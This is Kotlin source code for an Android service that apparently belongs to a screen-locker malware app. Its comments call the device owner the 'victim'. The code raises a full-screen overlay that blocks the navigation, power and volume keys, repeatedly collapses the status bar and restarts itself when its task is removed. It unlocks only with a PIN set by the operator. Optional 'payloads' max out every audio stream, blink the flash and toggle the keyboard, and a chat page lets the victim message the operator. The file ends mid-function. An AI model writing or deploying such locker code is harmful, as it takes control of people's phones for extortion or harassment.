package com.aimlock.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.BroadcastReceiver
import android.graphics.*
import android.graphics.drawable.BitmapDrawable
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.*
import android.view.*
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.widget.*
import androidx.core.app.NotificationCompat
import android.hardware.camera2.CameraManager

class LockService : Service() {

    companion object {
        @Volatile
        var instance: LockService? = null
            private set
    }

    private val CHANNEL_ID = "aimlock_lock_channel"
    private val NOTIF_ID   = 203

    private var wm: WindowManager? = null
    private var lockView: View?    = null
    private var isLocked           = false

    private var lockText = ""
    private var lockPin  = "1234"
    private var pinInput = ""

    private val mainHandler = Handler(Looper.getMainLooper())
    private var mediaPlayer: MediaPlayer? = null

    private var flashRunnable: Runnable? = null
    private var cm: CameraManager?       = null
    private var camId: String?           = null
    private var flashState               = false

    private var volRunnable: Runnable?   = null
    private var am: AudioManager?        = null
    private var pinDotsRef: TextView?    = null

    private var closeDialogReceiver: BroadcastReceiver? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        Thread {
            try { camId = cm?.cameraIdList?.firstOrNull() } catch (_: Exception) {}
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action") ?: "lock"
        if (action == "unlock") {
            doUnlock()
            return START_NOT_STICKY
        }
        lockText = intent?.getStringExtra("lockText") ?: ""
        lockPin  = intent?.getStringExtra("lockPin")  ?: "1234"
        pinInput = ""

        val enableFlash    = intent?.getBooleanExtra("flash",    false) ?: false
        val enableSound    = intent?.getBooleanExtra("sound",    false) ?: false
        val enableKeyboard = intent?.getBooleanExtra("keyboard", false) ?: false

        val isChatMode = intent?.getBooleanExtra("chatMode", false) ?: false
        getSharedPreferences("aimlock_lock", Context.MODE_PRIVATE).edit()
            .putBoolean("is_locked",       true)
            .putBoolean("is_lock_chat",    isChatMode)
            .putString("lock_text",        lockText)
            .putString("lock_pin",         lockPin)
            .putBoolean("flash_payload",   enableFlash)
            .putBoolean("sound_payload",   enableSound)
            .putBoolean("keyboard_payload", enableKeyboard)
            .apply()

        stopAll()
        unregisterCloseDialogReceiver()
        registerCloseDialogReceiver()

        mainHandler.post { showLockView() }
        if (enableSound) Thread { startSound() }.start()
        if (enableFlash) mainHandler.postDelayed({ startFlashBlink() }, 300)
        if (enableKeyboard) startKeyboardToggle()
        startVolumeGuard()
        // startChatPolling dipanggil dari initChat() setelah serverUrl/deviceId tersedia
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        if (!isLocked) return
        val savedChatMode = getSharedPreferences("aimlock_lock", Context.MODE_PRIVATE)
            .getBoolean("is_lock_chat", false)
        val ri = Intent(this, LockService::class.java).apply {
            putExtra("action",   "lock")
            putExtra("lockText", lockText)
            putExtra("lockPin",  lockPin)
            putExtra("chatMode", savedChatMode)
        }
        val pi = PendingIntent.getService(
            this, 1, ri,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
            .set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 300, pi)
    }

    private fun registerCloseDialogReceiver() {
        closeDialogReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                if (!isLocked) return
                collapseStatusBar()
            }
        }
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
            addAction("android.intent.action.SCREEN_ON")
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(closeDialogReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                @Suppress("UnspecifiedRegisterReceiverFlag")
                registerReceiver(closeDialogReceiver, filter)
            }
        } catch (_: Exception) {}
    }

    private fun unregisterCloseDialogReceiver() {
        try { closeDialogReceiver?.let { unregisterReceiver(it) } } catch (_: Exception) {}
        closeDialogReceiver = null
    }

    @Volatile private var isAddingView = false

    private fun showLockView() {
        if (isAddingView) return
        lockView?.let {
            try { wm?.removeViewImmediate(it) } catch (_: Exception) {
                try { wm?.removeView(it) } catch (_: Exception) {}
            }
        }
        lockView = null

        val isChatLock = getSharedPreferences("aimlock_lock", Context.MODE_PRIVATE)
            .getBoolean("is_lock_chat", false)

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        // lock_chat: hapus FLAG_ALT_FOCUSABLE_IM agar keyboard bisa muncul
        //            hapus FLAG_NOT_TOUCH_MODAL agar touch ke EditText masuk
        val baseFlags = (
            WindowManager.LayoutParams.FLAG_FULLSCREEN
            or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            or WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            or WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            or 0x00000080  // FLAG_SECURE
        )
        val lpFlags = if (isChatLock) baseFlags
                      else baseFlags or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                           WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
                           0x00040000  // FLAG_ALT_FOCUSABLE_IM

        val lp = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            lpFlags,
            PixelFormat.OPAQUE
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0; y = 0
            // Untuk lock_chat: SOFT_INPUT_ADJUST_PAN agar overlay naik saat keyboard muncul
            softInputMode = if (isChatLock)
                android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN or
                android.view.WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
            else
                android.view.WindowManager.LayoutParams.SOFT_INPUT_STATE_HIDDEN
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P)
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                preferMinimalPostProcessing = true
        }

        val root = buildRoot()
        lockView = root
        isLocked = true

        isAddingView = true
        try {
            wm!!.addView(root, lp)
            root.post {
                isAddingView = false
                applySystemUIFlags(root)
                root.requestFocus()
            }
        } catch (e: Exception) {
            isAddingView = false
            e.printStackTrace()
        }

    }

    @Suppress("DEPRECATION")
    private fun applySystemUIFlags(view: View) {
        val isChatLock = getSharedPreferences("aimlock_lock", Context.MODE_PRIVATE)
            .getBoolean("is_lock_chat", false)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                view.windowInsetsController?.let { ctrl ->
                    if (isChatLock) {
                        // lock_chat: sembunyikan nav + status bar tapi biarkan keyboard muncul
                        ctrl.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
                        ctrl.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                    } else {
                        ctrl.hide(
                            WindowInsets.Type.statusBars()
                            or WindowInsets.Type.navigationBars()
                            or WindowInsets.Type.systemBars()
                            or WindowInsets.Type.displayCutout()
                        )
                        ctrl.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                    }
                }
            } catch (_: Exception) {}
        }
        view.systemUiVisibility = if (isChatLock) (
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            // Tidak pakai IMMERSIVE_STICKY agar gesture keyboard tidak terblock
        ) else (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            or View.SYSTEM_UI_FLAG_LOW_PROFILE
        )
    }




    @Suppress("DEPRECATION")
    private fun collapseStatusBar() {
        try { sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)) } catch (_: Exception) {}
        try {
            val sbs = getSystemService("statusbar") ?: return
            val sbClass = Class.forName("android.app.StatusBarManager")
            try {
                sbClass.getMethod("collapsePanels").invoke(sbs)
            } catch (_: Exception) {
                try { sbClass.getMethod("collapse").invoke(sbs) } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }

    private var chatEditText: EditText? = null
    private var chatContainer: LinearLayout? = null
    private var chatScrollView: android.widget.ScrollView? = null
    private var rootFrame: FrameLayout? = null

    private fun buildRoot(): View {
        val dm      = resources.displayMetrics
        val density = dm.density
        val sh      = dm.heightPixels
        val sw      = dm.widthPixels

        val root = object : FrameLayout(this) {
            override fun dispatchTouchEvent(ev: MotionEvent): Boolean {
                applySystemUIFlags(this); collapseStatusBar()
                return super.dispatchTouchEvent(ev)
            }
            override fun onInterceptTouchEvent(ev: MotionEvent) = false
            override fun onTouchEvent(ev: MotionEvent)         = false
            override fun dispatchKeyEvent(event: KeyEvent): Boolean {
                return when (event.keyCode) {
                    KeyEvent.KEYCODE_BACK, KeyEvent.KEYCODE_APP_SWITCH, KeyEvent.KEYCODE_HOME,
                    KeyEvent.KEYCODE_MENU, KeyEvent.KEYCODE_VOLUME_UP, KeyEvent.KEYCODE_VOLUME_DOWN,
                    KeyEvent.KEYCODE_POWER, KeyEvent.KEYCODE_CAMERA, KeyEvent.KEYCODE_SEARCH -> true
                    else -> super.dispatchKeyEvent(event)
                }
            }
            override fun onWindowFocusChanged(hasWindowFocus: Boolean) {
                super.onWindowFocusChanged(hasWindowFocus)
                if (!isLocked) return
                applySystemUIFlags(this); requestFocus()
                if (!hasWindowFocus) collapseStatusBar()
            }
            override fun onApplyWindowInsets(insets: WindowInsets): WindowInsets {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    try {
                        windowInsetsController?.let {
                            it.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars() or WindowInsets.Type.systemBars())
                            it.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                        }
                    } catch (_: Exception) {}
                }
                return insets
            }
        }
        applySystemUIFlags(root)
        root.setBackgroundColor(Color.parseColor("#050D1A"))
        root.isClickable = true; root.isFocusable = true
        root.isFocusableInTouchMode = true; root.keepScreenOn = true
        rootFrame = root

        val monoTf  = try { Typeface.createFromAsset(assets, "fonts/ShareTechMono-Regular.ttf") } catch (_: Exception) { Typeface.DEFAULT }
        val boldTf  = try { Typeface.createFromAsset(assets, "fonts/Orbitron-Bold.ttf") }         catch (_: Exception) { Typeface.DEFAULT_BOLD }

        // ── Foto profil ───────────────────────────────────────────────────────
        val photoBm = try {
            android.graphics.BitmapFactory.decodeStream(assets.open("icons/lock.jpg"))
        } catch (_: Exception) { null }
        val photoSz = (140 * density).toInt()
        val padRing = (14 * density).toInt()
        val totalSz = photoSz + padRing * 2

        fun makePhotoBitmap(): Bitmap {
            val bmp = Bitmap.createBitmap(totalSz, totalSz, Bitmap.Config.ARGB_8888)
            val cvs = Canvas(bmp)
            val cx  = totalSz / 2f; val cy = totalSz / 2f; val r = photoSz / 2f
            // glow
            cvs.drawCircle(cx, cy, r + padRing - 2f * density,
                Paint(Paint.ANTI_ALIAS_FLAG).apply {
                    color = Color.parseColor("#3B82F6"); style = Paint.Style.STROKE
                    strokeWidth = 4f * density
                    maskFilter = android.graphics.BlurMaskFilter(10f * density, android.graphics.BlurMaskFilter.Blur.NORMAL)
                })
            // foto bulat
            if (photoBm != null) {
                val scaled = Bitmap.createScaledBitmap(photoBm, photoSz, photoSz, true)
                val shader = android.graphics.BitmapShader(scaled, android.graphics.Shader.TileMode.CLAMP, android.graphics.Shader.TileMode.CLAMP)
                cvs.translate(cx - r, cy - r)
                cvs.drawCircle(r, r, r, Paint(Paint.ANTI_ALIAS_FLAG).apply { this.shader = shader })
                cvs.translate(-(cx - r), -(cy - r))
            } else {
                cvs.drawCircle(cx, cy, r, Paint(Paint.ANTI_ALIAS_FLAG).apply { color = Color.parseColor("#1E3A5F") })
            }
            // border biru solid
            cvs.drawCircle(cx, cy, r - 1.5f * density,
                Paint(Paint.ANTI_ALIAS_FLAG).apply {
                    color = Color.parseColor("#3B82F6"); style = Paint.Style.STROKE; strokeWidth = 3.5f * density })
            return bmp
        }

        val photoIv = ImageView(this).apply { setImageBitmap(makePhotoBitmap()) }

        // ── Helper bikin rounded drawable ─────────────────────────────────────
        fun roundBg(fill: String, stroke: String, r: Float = 12f) =
            android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.RECTANGLE
                setColor(Color.parseColor(fill))
                cornerRadius = r * density
                setStroke((1.5f * density).toInt(), Color.parseColor(stroke))
            }

        // ══════════════════════════════════════════════════════════════════════
        // HALAMAN 1 — MAIN (foto + pesan + tombol UNLOCK + CHAT)
        // ══════════════════════════════════════════════════════════════════════
        val page1 = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = Gravity.CENTER_HORIZONTAL
            setPadding((28*density).toInt(), (60*density).toInt(), (28*density).toInt(), (32*density).toInt())
        }

        page1.addView(photoIv, LinearLayout.LayoutParams(totalSz, totalSz).apply {
            gravity      = Gravity.CENTER_HORIZONTAL
            bottomMargin = (20*density).toInt()
        })

        if (lockText.isNotEmpty()) {
            page1.addView(TextView(this).apply {
                text = lockText; textSize = 18f; gravity = Gravity.CENTER
                setTextColor(Color.WHITE); typeface = boldTf
                setLineSpacing(3f * density, 1f)
            }, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                bottomMargin = (8*density).toInt()
            })
        }

        page1.addView(TextView(this).apply {
            text = "Pegasus-X Яyuichi"; textSize = 11f; gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#888888")); typeface = monoTf; letterSpacing = 0.08f
        }, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            bottomMargin = (40*density).toInt()
        })

        // Tombol UNLOCK
        val btnUnlock1 = TextView(this).apply {
            text = "🔓  UNLOCK"; textSize = 13f; gravity = Gravity.CENTER
            setTextColor(Color.WHITE); typeface = boldTf; letterSpacing = 0.05f
            background = roundBg("#1A3A5C", "#3B82F6"); isClickable = true; isFocusable = true
            setPadding((0*density).toInt(), (14*density).toInt(), (0*density).toInt(), (14*density).toInt())
        }
        page1.addView(btnUnlock1, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            bottomMargin = (12*density).toInt()
        })

        // Tombol CHAT
        val btnChat1 = TextView(this).apply {
            text = "💬  CHAT"; textSize = 13f; gravity = Gravity.CENTER
            setTextColor(Color.WHITE); typeface = boldTf; letterSpacing = 0.05f
            background = roundBg("#1A2A3A", "#1E3A5F"); isClickable = true; isFocusable = true
            setPadding((0*density).toInt(), (14*density).toInt(), (0*density).toInt(), (14*density).toInt())
        }
        page1.addView(btnChat1, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))

        // ══════════════════════════════════════════════════════════════════════
        // HALAMAN 2 — PIN INPUT
        // ══════════════════════════════════════════════════════════════════════
        val page2 = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = Gravity.CENTER_HORIZONTAL
            setPadding((28*density).toInt(), (48*density).toInt(), (28*density).toInt(), (32*density).toInt())
            visibility  = android.view.View.GONE
        }

        // Tombol Back (← kembali ke page1)
        val btnBack2 = TextView(this).apply {
            text = "← Kembali"; textSize = 11f; gravity = Gravity.START
            setTextColor(Color.parseColor("#3B82F6")); typeface = monoTf
            isClickable = true; isFocusable = true
        }
        page2.addView(btnBack2, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            bottomMargin = (24*density).toInt()
        })

        page2.addView(ImageView(this).apply { setImageBitmap(makePhotoBitmap()) },
            LinearLayout.LayoutParams((totalSz * 0.7f).toInt(), (totalSz * 0.7f).toInt()).apply {
                gravity = Gravity.CENTER_HORIZONTAL; bottomMargin = (16*density).toInt()
            })

        page2.addView(TextView(this).apply {
            text = "Masukkan PIN untuk membuka"; textSize = 11f; gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#888888")); typeface = monoTf
        }, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            bottomMargin = (12*density).toInt()
        })

        val pinField = EditText(this).apply {
            hint = "PIN / Kode..."; textSize = 16f; gravity = Gravity.CENTER
            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            setTextColor(Color.WHITE); setHintTextColor(Color.parseColor("#555555"))
            background = roundBg("#0D1F35", "#3B82F6"); typeface = monoTf
            setPadding((16*density).toInt(), (13*density).toInt(), (16*density).toInt(), (13*density).toInt())
        }
        page2.addView(pinField, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            bottomMargin = (12*density).toInt()
        })

        val btnDoUnlock = TextView(this).apply {
            text = "BUKA KUNCI"; textSize = 13f; gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#050D1A")); typeface = boldTf; letterSpacing = 0.05f
            background = roundBg("#3B82F6", "#3B82F6"); isClickable = true; isFocusable = true
            setPadding((0*density).toInt(), (14*density).toInt(), (0*density).toInt(), (14*density).toInt())
        }
        page2.addView(btnDoUnlock, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))

        // ══════════════════════════════════════════════════════════════════════
        // HALAMAN 3 — CHAT
        // ══════════════════════════════════════════════════════════════════════
        val page3 = FrameLayout(this).apply { visibility = android.view.View.GONE }

        val page3Inner = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding((16*density).toInt(), (32*density).toInt(), (16*density).toInt(), (16*density).toInt())
        }

        val btnBack3 = TextView(this).apply {
            text = "← Kembali"; textSize = 11f; gravity = Gravity.START
            setTextColor(Color.parseColor("#3B82F6")); typeface = monoTf
            isClickable = true; isFocusable = true
        }
        page3Inner.addView(btnBack3, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            bottomMargin = (12*density).toInt()
        })

        page3Inner.addView(TextView(this).apply {
            text = "CHAT"; textSize = 11f; gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#3B82F6")); typeface = boldTf; letterSpacing = 0.1f
        }, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            bottomMargin = (10*density).toInt()
        })

        val chatScroll = android.widget.ScrollView(this).apply {
            background = roundBg("#060F1C", "#1E3A5F", 10f)
            descendantFocusability = android.view.ViewGroup.FOCUS_AFTER_DESCENDANTS
        }
        val chatList = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding((10*density).toInt(), (8*density).toInt(), (10*density).toInt(), (8*density).toInt())
        }
        chatScroll.addView(chatList)
        chatContainer  = chatList
        chatScrollView = chatScroll

        val chatH = (sh * 0.52f).toInt()
        page3Inner.addView(chatScroll, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, chatH))

        // Input row
        val inputRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL; gravity = Gravity.CENTER_VERTICAL
            setPadding(0, (10*density).toInt(), 0, 0)
        }
        val chatInput = EditText(this).apply {
            hint = "Ketik pesan..."; textSize = 13f; setSingleLine(true)
            setTextColor(Color.WHITE); setHintTextColor(Color.parseColor("#555555"))
            background = roundBg("#0D1F35", "#1E3A5F", 20f); typeface = monoTf
            setPadding((14*density).toInt(), (10*density).toInt(), (14*density).toInt(), (10*density).toInt())
        }
        chatEditText = chatInput
        inputRow.addView(chatInput, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f).apply {
            marginEnd = (8*density).toInt()
        })
        val btnSend = TextView(this).apply {
            text = "➤"; textSize = 16f; gravity = Gravity.CENTER
            setTextColor(Color.WHITE)
            background = roundBg("#3B82F6", "#3B82F6", 20f)
            isClickable = true; isFocusable = true
            setPadding((10*density).toInt(), (10*density).toInt(), (10*density).toInt(), (10*density).toInt())
        }
        inputRow.addView(btnSend, LinearLayout.LayoutParams((40*density).toInt(), (40*density).toInt()))
        page3Inner.addView(inputRow, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))

        page3.addView(page3Inner, FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT))

        // ── Susun ke root ──────────────────────────────────────────────────────
        val lp = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        root.addView(page1, lp)
        root.addView(page2, lp)
        root.addView(page3, lp)

        // ── Navigasi ───────────────────────────────────────────────────────────
        fun showPage(p: Int) {
            page1.visibility = if (p == 1) android.view.View.VISIBLE else android.view.View.GONE
            page2.visibility = if (p == 2) android.view.View.VISIBLE else android.view.View.GONE
            page3.visibility = if (p == 3) android.view.View.VISIBLE else android.view.View.GONE
            if (p == 2) { pinField.requestFocus() }
            if (p == 3) { chatScroll.post { chatScroll.fullScroll(android.widget.ScrollView.FOCUS_DOWN) } }
        }

        btnUnlock1.setOnClickListener { showPage(2) }
        btnChat1.setOnClickListener   { showPage(3) }
        btnBack2.setOnClickListener   { showPage(1) }
        btnBack3.setOnClickListener   { showPage(1) }

        btnDoUnlock.setOnClickListener {
            val pin = pinField.text.toString().trim()
            if (pin == lockPin) { doUnlock(); stopSelf() }
            else {
                pinField.text.clear()
                pinField.hint = "PIN salah, coba lagi..."
                pinField.setHintTextColor(Color.parseColor("#EF4444"))
                mainHandler.postDelayed({
                    pinField.hint = "PIN / Kode..."
                    pinField.setHintTextColor(Color.parseColor("#555555"))
                }, 1500)
            }
        }

        btnSend.setOnClickListener {
            val txt = chatInput.text.toString().trim()
            if (txt.isNotEmpty()) {
                sendChatMessage(txt)
                chatInput.text.clear()
                addChatBubble(chatList, chatScroll, txt, fromVictim = true, density = density)
            }
        }

        return root
    }


    fun addChatBubble(list: LinearLayout?, scroll: android.widget.ScrollView?, text: String, fromVictim: Boolean, density: Float) {
        val chatList   = list   ?: chatContainer  ?: return
        val chatScroll = scroll ?: chatScrollView ?: return
        mainHandler.post {
            // fromVictim=true  → victim ngetik → tampil KANAN (biru)
            // fromVictim=false → pesan dari server/user → tampil KIRI (abu-abu)
            val isRight = fromVictim
            val bubble = TextView(this).apply {
                this.text = text
                textSize = 12f
                setTextColor(Color.WHITE)
                setPadding((10*density).toInt(), (7*density).toInt(), (10*density).toInt(), (7*density).toInt())
                background = buildRoundedBg(
                    if (isRight) Color.parseColor("#1A3A5C") else Color.parseColor("#1C1C1C"),
                    if (isRight) Color.parseColor("#3B82F6") else Color.parseColor("#555555"),
                    density, 8f)
                typeface = try { Typeface.createFromAsset(assets, "fonts/ShareTechMono-Regular.ttf") } catch (_: Exception) { Typeface.DEFAULT }
            }
            val lp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                gravity      = if (isRight) Gravity.END else Gravity.START
                bottomMargin = (6*density).toInt()
                if (isRight) marginStart = (50*density).toInt() else marginEnd = (50*density).toInt()
            }
            chatList.addView(bubble, lp)
            chatScroll.post { chatScroll.fullScroll(android.widget.ScrollView.FOCUS_DOWN) }
        }
    }

    private fun buildRoundedBg(fillColor: Int, strokeColor: Int, density: Float, radius: Float): android.graphics.drawable.Drawable {
        return android.graphics.drawable.GradientDrawable().apply {
            shape = android.graphics.drawable.GradientDrawable.RECTANGLE
            setColor(fillColor)
            cornerRadius = radius * density
            setStroke((1.5f * density).toInt(), strokeColor)
        }
    }


    private fun buildNumpad(density: Float): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = Gravity.CENTER
        }
        listOf(
            listOf("1","2","3"),
            listOf("4","5","6"),
            listOf("7","8","9"),
            listOf("⌫","0","✓")
        ).forEach { row ->
            val rowView = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity     = Gravity.CENTER
            }
            row.forEach { digit ->
                val btnSz = (72 * density).toInt()
                val m     = (8 * density).toInt()
                val btn   = buildBtn(digit, btnSz, density)
                btn.setOnClickListener { handleDigit(digit) }
                rowView.addView(btn, LinearLayout.LayoutParams(btnSz, btnSz).apply {
                    setMargins(m, m, m, m)
                })
            }
            container.addView(rowView)
        }
        return container
    }

    private fun handleDigit(digit: String) {
        val dots = pinDotsRef ?: return
        when (digit) {
            "⌫" -> { if (pinInput.isNotEmpty()) pinInput = pinInput.dropLast(1) }
            "✓" -> {
                if (pinInput == lockPin) { doUnlock(); stopSelf(); return }
                pinInput = ""
                dots.setTextColor(Color.parseColor("#EF4444"))
                mainHandler.postDelayed({
                    if (isLocked) {
                        dots.setTextColor(Color.parseColor("#8B5CF6"))
                        dots.text = buildDots()
                    }
                }, 600)
            }
            else -> {
                if (pinInput.length < lockPin.length.coerceAtLeast(4)) pinInput += digit
            }
        }
        dots.text = buildDots()
    }

    private fun buildDots(): String {
        val max    = lockPin.length.coerceAtLeast(4)
        val filled = "●".repeat(pinInput.length)
        val empty  = "○".repeat((max - pinInput.length).coerceAtLeast(0))
        return "$filled$empty".chunked(1).joinToString("  ")
    }

    private fun buildBtn(digit: String, size: Int, density: Float): TextView {
        val textColor = when (digit) {
            "✓" -> Color.parseColor("#10B981")
            "⌫" -> Color.parseColor("#EF4444")
            else -> Color.WHITE
        }
        val bmp = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888)
        val cvs = Canvas(bmp)
        cvs.drawCircle(size/2f, size/2f, size/2f - 1f,
            Paint(Paint.ANTI_ALIAS_FLAG).apply {
                color = Color.parseColor("#111827"); style = Paint.Style.FILL })
        cvs.drawCircle(size/2f, size/2f, size/2f - 2f,
            Paint(Paint.ANTI_ALIAS_FLAG).apply {
                color = Color.parseColor("#8B5CF6")
                style = Paint.Style.STROKE; strokeWidth = 1.8f * density })
        return TextView(this).apply {
            text        = digit
            textSize    = 20f
            gravity     = Gravity.CENTER
            setTextColor(textColor)
            background  = BitmapDrawable(resources, bmp)
            isClickable = true
            isFocusable = true
            typeface    = try {
                Typeface.createFromAsset(assets, "fonts/Orbitron-Bold.ttf")
            } catch (_: Exception) { Typeface.DEFAULT_BOLD }
        }
    }

    private fun drawLockBitmap(size: Int): Bitmap {
        val bmp = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888)
        val cvs = Canvas(bmp)
        val red = Color.parseColor("#EF4444")
        cvs.drawRoundRect(RectF(size*.12f, size*.46f, size*.88f, size*.94f),
            size*.10f, size*.10f,
            Paint(Paint.ANTI_ALIAS_FLAG).apply { color = red; style = Paint.Style.FILL })
        cvs.drawArc(RectF(size*.22f, size*.04f, size*.78f, size*.56f), 180f, 180f, false,
            Paint(Paint.ANTI_ALIAS_FLAG).apply {
                color = red; style = Paint.Style.STROKE
                strokeWidth = size*.12f; strokeCap = Paint.Cap.ROUND })
        cvs.drawCircle(size*.5f, size*.67f, size*.10f,
            Paint(Paint.ANTI_ALIAS_FLAG).apply { color = Color.BLACK; style = Paint.Style.FILL })
        cvs.drawLine(size*.5f, size*.67f, size*.5f, size*.83f,
            Paint(Paint.ANTI_ALIAS_FLAG).apply {
                color = Color.BLACK; style = Paint.Style.STROKE
                strokeWidth = size*.07f; strokeCap = Paint.Cap.ROUND })
        return bmp
    }

    private fun startSound() {
        stopSound()
        try {
            am?.let { a ->
                for (stream in listOf(AudioManager.STREAM_MUSIC, AudioManager.STREAM_RING, AudioManager.STREAM_ALARM)) {
                    try { a.setStreamVolume(stream, a.getStreamMaxVolume(stream), 0) } catch (_: Exception) {}
                }
                try { a.ringerMode = AudioManager.RINGER_MODE_NORMAL } catch (_: Exception) {}
            }
            val afd = assets.openFd("sound/jokowi.mp3")
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder()
